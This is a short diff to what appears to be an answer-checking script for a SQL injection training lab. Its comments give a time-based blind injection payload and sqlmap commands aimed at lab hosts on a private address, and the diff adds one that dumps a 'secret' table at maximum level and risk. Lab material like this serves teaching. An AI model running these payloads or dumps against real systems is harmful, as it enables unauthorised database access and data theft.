@@ -72,3 +72,5 @@ def checkanswer(labnum, answer):
 # 5) Time based 
 #    Payload: value=1 AND (SELECT 1747 FROM (SELECT(SLEEP(5)))qZWz)&lab=4
 #    sqlmap -u "http://10.24.0.137/lab4/" --data "value=1&lab=4" --cookie="sqlilab=phxwfwspqs"
+
+# sqlmap -u "http://10.24.0.137/lab5/" --data "value=1&lab=5" -p value --cookie="sqlilab=fripqxejmw" --level 5 --dbms=mysql --risk 3 --dump -T secret --flush-session
